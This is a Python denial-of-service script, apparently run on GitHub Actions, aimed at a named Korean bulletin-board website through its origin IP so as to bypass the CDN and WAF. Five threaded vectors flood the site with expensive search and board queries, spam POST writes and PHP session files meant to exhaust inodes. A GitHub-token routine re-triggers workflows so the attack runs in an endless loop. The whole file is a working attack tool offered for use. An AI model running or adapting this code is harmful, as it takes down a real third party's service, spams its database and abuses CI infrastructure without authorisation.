#!/usr/bin/env python3
"""
pnation.com DB Flood Attack v3
===============================
Target: 54.180.71.132 (AWS origin IP, DIRECT - NO CDN/WAF!)
Strategy: 5 attack vectors hitting Apache/PHP/MySQL directly
  - ajax.filter.php, board.php, search.php, write.php, session flood
Duration: 25 min x 10 nodes x 3 workflows = massive
Threads: 20 per vector x 5 vectors = 100 total
"""

import requests
import threading
import time
import random
import string
import os
import sys
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from concurrent.futures import ThreadPoolExecutor

TARGET = "https://54.180.71.132"  # 直连 AWS 源站 IP (HTTPS, bypass CDN/WAF)
DURATION = 25 * 60  # 25 minutes
THREADS_PER_VECTOR = 20  # 20 threads per attack vector

# Stats
stats = {
    "ajax_filter": 0,
    "board_queries": 0,
    "search_queries": 0,
    "write_attacks": 0,
    "sessions_created": 0,
    "errors": 0,
    "start_time": 0,
}
stats_lock = threading.Lock()

# ===========================
# Vector ①: ajax.filter.php
# ===========================
def flood_ajax_filter():
    fsearch_pool = [
        "test", "admin", "sql", "injection", "xss", "pnation",
        "security", "hack", "exploit", "web", "php", "mysql",
        "union", "select", "drop", "insert", "update", "delete",
    ] + ["".join(random.choices(string.ascii_lowercase, k=random.randint(4, 20))) for _ in range(30)]

    sess = requests.Session()
    sess.verify = False
    sess.headers.update({
        "Host": "pnation.com",
        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{random.randint(90,125)}.0.{random.randint(1000,9999)}.{random.randint(10,999)} Safari/537.36",
        "Accept": "*/*",
        "Connection": "keep-alive",
    })

    while time.time() - stats["start_time"] < DURATION:
        params = {
            "fsearch": random.choice(fsearch_pool),
            "page": str(random.randint(1, 500)),
            "bo_table": random.choice(["free", "notice", "gallery", "qa"]),
        }
        try:
            sess.get(f"{TARGET}/bbs/ajax.filter.php", params=params, timeout=5)
            with stats_lock:
                stats["ajax_filter"] += 1
        except:
            with stats_lock:
                stats["errors"] += 1
        time.sleep(0.001)


# ===========================
# Vector ②: board.php (帖子列表 — JOIN-heavy)
# ===========================
def flood_board():
    bo_tables = ["free", "notice", "gallery", "qa", "etc"]
    sess = requests.Session()
    sess.verify = False
    sess.headers.update({
        "Host": "pnation.com",
        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{random.randint(90,125)}.0.{random.randint(1000,9999)}.{random.randint(10,999)} Safari/537.36",
        "Accept": "text/html,*/*",
        "Connection": "keep-alive",
    })

    while time.time() - stats["start_time"] < DURATION:
        bo = random.choice(bo_tables)
        page = random.randint(1, 9999)
        params = {"bo_table": bo, "page": str(page)}
        try:
            sess.get(f"{TARGET}/bbs/board.php", params=params, timeout=5)
            with stats_lock:
                stats["board_queries"] += 1
        except:
            with stats_lock:
                stats["errors"] += 1
        time.sleep(0.001)


# ===========================
# Vector ③: search.php (全文搜索 — 最吃DB/CPU)
# ===========================
def flood_search():
    """Full-text search is the most expensive DB operation — LIKE %% on every row"""
    search_terms = [
        "test", "hello", "world", "admin", "security",
        "database", "mysql", "php", "apache", "linux",
    ] + ["".join(random.choices(string.ascii_lowercase, k=random.randint(2, 8))) for _ in range(40)]
    # Unicode-heavy terms to force charset conversion overhead
    unicode_terms = [
        "한국어검색", "日本語検索", "中文搜索", "поиск",
        "テスト", "테스트", "テスト検索", "日本語テスト",
    ]

    sess = requests.Session()
    sess.verify = False
    sess.headers.update({
        "Host": "pnation.com",
        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{random.randint(90,125)}.0.{random.randint(1000,9999)}.{random.randint(10,999)} Safari/537.36",
        "Accept": "text/html,*/*",
        "Connection": "keep-alive",
    })

    while time.time() - stats["start_time"] < DURATION:
        term = random.choice(search_terms + unicode_terms)
        try:
            sess.get(f"{TARGET}/bbs/search.php", params={
                "sfl": random.choice(["wr_subject", "wr_content", "wr_name", "mb_id"]),
                "stx": term,
                "sop": random.choice(["and", "or"]),
                "gr_id": "",
            }, timeout=5)
            with stats_lock:
                stats["search_queries"] += 1
        except:
            with stats_lock:
                stats["errors"] += 1
        time.sleep(0.005)  # search is heavy, slight delay to avoid self-DoS


# ===========================
# Vector ④: write.php POST (DB写入压力)
# ===========================
def flood_write():
    """POST to write.php — triggers DB INSERT, indexes, and session writes"""
    bo_tables = ["free", "notice", "qa", "gallery", "etc"]
    sess = requests.Session()
    sess.verify = False
    sess.headers.update({
        "Host": "pnation.com",
        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{random.randint(90,125)}.0.{random.randint(1000,9999)}.{random.randint(10,999)} Safari/537.36",
        "Accept": "text/html,*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "keep-alive",
    })

    while time.time() - stats["start_time"] < DURATION:
        bo = random.choice(bo_tables)
        data = {
            "w": "w",
            "bo_table": bo,
            "wr_subject": "".join(random.choices(string.ascii_letters + string.digits, k=random.randint(10, 40))),
            "wr_content": "".join(random.choices(string.ascii_letters + string.digits + " ", k=random.randint(50, 200))),
            "wr_name": "".join(random.choices(string.ascii_lowercase, k=random.randint(3, 10))),
            "wr_password": "".join(random.choices(string.ascii_letters + string.digits, k=8)),
        }
        try:
            sess.post(f"{TARGET}/bbs/write.php?bo_table={bo}", data=data, timeout=5)
            with stats_lock:
                stats["write_attacks"] += 1
        except:
            with stats_lock:
                stats["errors"] += 1
        time.sleep(0.002)


# ===========================
# Vector ⑤: Session Flood (inode exhaustion)
# ===========================
def flood_session():
    """Create unlimited PHPSESSID files — each new session = 1 new file in /tmp"""
    pages = [
        "/",                     # index.php
        "/bbs/board.php",        # 게시판
        "/bbs/login.php",        # 로그인
        "/bbs/faq.php",          # FAQ
        "/bbs/current_connect.php",  # 접속자
    ]

    while time.time() - stats["start_time"] < DURATION:
        sess = requests.Session()
        sess.headers.update({
            "Host": "pnation.com",
            "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{random.randint(90,125)}.0.{random.randint(1000,9999)}.{random.randint(10,999)} Safari/537.36",
        })
        try:
            sess.get(f"{TARGET}{random.choice(pages)}", timeout=5)
            with stats_lock:
                stats["sessions_created"] += 1
        except:
            with stats_lock:
                stats["errors"] += 1
        time.sleep(0.01)


# ===========================
# Sustain: 自循环触发下一轮
# ===========================
def sustain_trigger():
    """Call GitHub API to dispatch the next workflow run — infinite loop"""
    token = os.environ.get("PAT") or os.environ.get("GITHUB_TOKEN", "")
    repo = os.environ.get("GITHUB_REPOSITORY", "wake875/pnation-db-flood")
    
    if not token:
        print("[Sustain] No GITHUB_TOKEN — skipping self-trigger")
        return

    # Determine which workflow to trigger next (round-robin A->B->C->A)
    current_wf = os.environ.get("SUSTAIN_NEXT", "")
    if not current_wf:
        print("[Sustain] No SUSTAIN_NEXT set — skipping")
        return

    url = f"https://api.github.com/repos/{repo}/actions/workflows/{current_wf}/dispatches"
    headers = {
        "Authorization": f"Bearer {token}",
        "Accept": "application/vnd.github.v3+json",
    }

    try:
        r = requests.post(url, json={"ref": "main"}, headers=headers, timeout=10)
        if r.status_code == 204:
            print(f"[Sustain] SUCCESS — Triggered next workflow: {current_wf}")
        else:
            print(f"[Sustain] FAILED — HTTP {r.status_code}: {r.text[:200]}")
    except Exception as e:
        print(f"[Sustain] ERROR: {e}")


# ===========================
# Status Reporter
# ===========================
def status_reporter():
    while time.time() - stats["start_time"] < DURATION:
        time.sleep(30)
        elapsed = time.time() - stats["start_time"]
        with stats_lock:
            total = (stats["ajax_filter"] + stats["board_queries"] +
                     stats["search_queries"] + stats["write_attacks"] +
                     stats["sessions_created"])
        print(f"[{elapsed:.0f}s] Filter:{stats['ajax_filter']} Board:{stats['board_queries']} "
              f"Search:{stats['search_queries']} Write:{stats['write_attacks']} "
              f"Sess:{stats['sessions_created']} | Total:{total} | Err:{stats['errors']}")


# ===========================
# Main
# ===========================
if __name__ == "__main__":
    node_id = os.environ.get("NODE_ID", "unknown")
    print(f"╔══════════════════════════════════════════════╗")
    print(f"║  pnation.com DB Flood v2 — Node {node_id:<3}            ║")
    print(f"╠══════════════════════════════════════════════╣")
    print(f"║  Target:  {TARGET:<31}║")
    print(f"║  Duration:{DURATION//60} min ({DURATION}s){' ' * 17}║")
    print(f"║  Vectors: 5 ({THREADS_PER_VECTOR}t each = {THREADS_PER_VECTOR*5}t){' ' * 10}║")
    print(f"╚══════════════════════════════════════════════╝")

    stats["start_time"] = time.time()

    # Start reporter
    threading.Thread(target=status_reporter, daemon=True).start()

    # Launch all attack vectors
    executors = []
    for _ in range(THREADS_PER_VECTOR):
        threading.Thread(target=flood_ajax_filter, daemon=True).start()
        threading.Thread(target=flood_board, daemon=True).start()
        threading.Thread(target=flood_search, daemon=True).start()
        threading.Thread(target=flood_write, daemon=True).start()
        threading.Thread(target=flood_session, daemon=True).start()

    print(f"All {THREADS_PER_VECTOR * 5} threads running. {DURATION//60} min countdown...")

    # Wait
    time.sleep(DURATION)

    # Summary
    with stats_lock:
        total = (stats["ajax_filter"] + stats["board_queries"] +
                 stats["search_queries"] + stats["write_attacks"] +
                 stats["sessions_created"])

    print("=" * 50)
    print(f"=== ATTACK COMPLETE — Node {node_id} ===")
    print(f"  ajax.filter.php:  {stats['ajax_filter']}")
    print(f"  board.php:        {stats['board_queries']}")
    print(f"  search.php:       {stats['search_queries']}")
    print(f"  write.php (POST): {stats['write_attacks']}")
    print(f"  Session files:    {stats['sessions_created']}")
    print(f"  TOTAL REQUESTS:   {total}")
    print(f"  Errors:           {stats['errors']}")
    print("=" * 50)

    # Self-sustain
    sustain_trigger()
